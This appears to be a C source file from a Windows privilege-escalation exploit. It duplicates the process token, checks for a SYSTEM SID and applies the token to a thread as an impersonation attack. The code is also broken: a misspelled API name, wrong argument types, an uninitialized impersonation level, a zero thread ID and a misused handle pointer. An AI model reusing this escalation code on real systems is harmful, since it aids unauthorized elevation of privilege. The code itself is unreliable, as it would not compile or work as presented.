#include <Windows.h>
#include <process.h>
#include "exploit_priv.h"

int __exploit_priv_impersonation() {
	HANDLE hProcessToken = NULL;	
	HANDLE hToken = NULL;
	HANDLE hThread= NULL;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	SID *lpSystemSID = NULL;
	BOOL bIsSystem = FALSE;
	DWORD dwThreadID = 0;
	SECURITY_IMPERSONATION_LEVEL SecurityImpersonation;
	SID_IDENTIFIER_AUTHORITY sid_auth;
		
	do {
		if(!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY, &hProcessToken)) {
			return -1;
		}

		if(!AllocateAndInitializeSid(&NtAuthority, 1, &sid_auth, 0,0,0,0,0,0,0, lpSystemSID)) {
			return -1;
		}

		if(!DiplicateTokenEx(hProcessToken,MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hToken)) {
			return -1;
		} 

		if(!CheckTokenMembership(hToken, lpSystemSID, &bIsSystem)) {
			return -1;
		}

		if(!(hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, dwThreadID))) {
			return -1;
		}

		if(!SetThreadToken(&hThread, hToken)) {
			return -1;
		}

	} while(0);	


	CloseHandle(hProcessToken);
	CloseHandle(hToken);
	CloseHandle(hThread);
	FreeSid(lpSystemSID);
	
	return 1;
}
